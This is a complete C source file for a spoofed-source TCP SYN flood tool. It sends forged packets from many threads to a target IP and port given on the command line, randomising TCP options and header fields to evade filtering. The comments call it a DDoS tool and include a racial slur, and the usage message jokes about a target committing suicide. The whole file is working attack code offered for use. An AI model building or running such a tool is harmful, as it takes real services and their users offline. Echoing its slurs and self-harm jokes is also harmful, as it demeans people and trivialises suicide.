/* 
    ok ok ok ok ok ok ok ok ok ok ok ok ok okok ok ok ok o kok ok ok ok ok o kok ok ok ok 
 */

#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
//only added structs for tcpopts without timestamp and shit to public script yeeeeeeeeeeee
struct tcpopts
{
        uint8_t msskind;
        uint8_t msslen;
        uint16_t mssvalue;
        uint8_t nop_nouse;
        uint8_t wskind;
        uint8_t wslen;
        uint8_t wsshiftcount;
        uint8_t nop_nouse2;
        uint8_t nop_nouse3;
        uint8_t sackkind;
        uint8_t sacklen;

};
void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
        x++;
        c++;
        }
        return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1;
    } else {
        low_num = max_num + 1;
        hi_num = min_num;
    }


    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}
unsigned short csum (unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int pipisize) {
        struct tcp_pseudo
        {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr) + pipisize);
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + pipisize;
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr) + pipisize);
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}
void setup_ip_header(struct iphdr *iph)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts);
        iph->id = htonl(54321);
        iph->frag_off = htons(0x4000);
        iph->ttl = MAXTTL;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = inet_addr("192.168.3.100");
}
void setup_tcp_header(struct tcphdr *tcph)
{
        tcph->source = htons(5678);
        tcph->check = 0;
        tcph->syn = 1;
        tcph->window = htons(64240);
        tcph->doff = ((sizeof (struct tcphdr)) + sizeof(struct tcpopts))/4;
}
//shit arrays ignore
int ctos[3] = {0, 40, 72};
int windows[3] = {29200, 64240, 65535};
uint8_t shiftcount[5] = {0x00, 0x03, 0x06, 0x09, 0x08};
//making cool func so opts are randomised whilst only 2 being random and me too lazy to make betta kode
void rand_options(struct tcpopts *opts){
        opts->nop_nouse = 0x01;
        opts->nop_nouse2 = 0x01;
        opts->nop_nouse3 = 0x01;
        opts->msskind = 0x02;
        opts->mssvalue = randnum(0, 65534);
        opts->msslen = 0x04;
        opts->wskind = 0x03;
        opts->wslen = 0x03;
        opts->wsshiftcount = shiftcount[randnum(0, 4)];
        opts->sackkind = 0x04;
        opts->sacklen = 0x02;
}
void *flood(void *par1)
{
        srand(time(NULL));
        char *td = (char *)par1;
        char datagram[MAX_PACKET_SIZE];
        struct iphdr *iph = (struct iphdr *)datagram;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
        struct tcpopts *opts = (void *)iph + sizeof(struct iphdr) + sizeof(struct tcphdr); //writiong these cool struct data to our packet yyeyeye
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = htons(floodport);
        sin.sin_addr.s_addr = inet_addr(td);
        int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
        if(s < 0){
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
        }
        memset(datagram, 0, MAX_PACKET_SIZE);
        setup_ip_header(iph);
        setup_tcp_header(tcph);
        rand_options(opts);
        tcph->dest = htons(floodport);
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
        int tmp = 1;
        const int *val = &tmp;
        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
        }
        init_rand(time(NULL));
        register unsigned int i;
        i = 0;
        while(1){
        rand_options(opts);//randomising these iopts hehehehhehe
        tcph->check = 0;//setting our checksum to 0 first ye
        tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF);//nigger really think we want to do handshake and respond with synack but its actually ddos XDDDDDDDDDDDDDDDD
        tcph->doff = ((sizeof (struct tcphdr)) + sizeof(struct tcpopts))/4; //secret hacvker shit okey ye
        tcph->dest = htons(floodport);//flöödpört
        iph->ttl = randnum(100,130);//time to live but i wanna die :(
        iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF); // spoooofsssss
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);//id and social security number for packetsssssss
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);//more mathssssssss
        tcph->source = htons(rand_cmwc() & 0xFFFF);//hacker shit
        tcph->dest = htons(floodport);//htonsssssssssssss
        tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpopts)); //doing maths to calc check ye
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)); // DDOSSSSSSSSS YEEEEEEEEEEEEEEEEE
        iph->tos = ctos[randnum(0,2)];//we a really important service
        tcph->window = htons(windows[randnum(0,2)]);//LINUX
        pps++;
        if(i >= limiter)
        {
        i = 0;
        usleep(sleeptime);
        }
        i++;
        }
}
int main(int argc, char *argv[ ])
{
        if(argc < 6){
        fprintf(stderr, "target gonna commit suicide like kurt cobain\n");
        fprintf(stdout, "controls (keyboard version): %s <internet protocol address> <porty port> <number of slaves you want to assign> <packets per fucking second> <how long, duh?>\n", argv[0]);
        exit(-1);
        }
        fprintf(stdout, "unnecessary text...\n");
        int num_threads = atoi(argv[3]);
        floodport = atoi(argv[2]);
        int maxpps = atoi(argv[4]);
        limiter = 0;
        pps = 0;
        pthread_t thread[num_threads];
        int multiplier = 12;
        int i;
        for(i = 0;i<num_threads;i++){
        pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
        }
        fprintf(stdout, "started dotdotdot\n");
        for(i = 0;i<(atoi(argv[5])*multiplier);i++)
        {
        usleep((1000/multiplier)*1000);
        if((pps*multiplier) > maxpps)
        {
        if(1 > limiter)
        {
        sleeptime+=100;
        } else {
        limiter--;
        }
        } else {
        limiter++;
        if(sleeptime > 25)
        {
        sleeptime-=25;
        } else {
        sleeptime = 0;
        }
        }
        pps = 0;
        }
        return 0;
}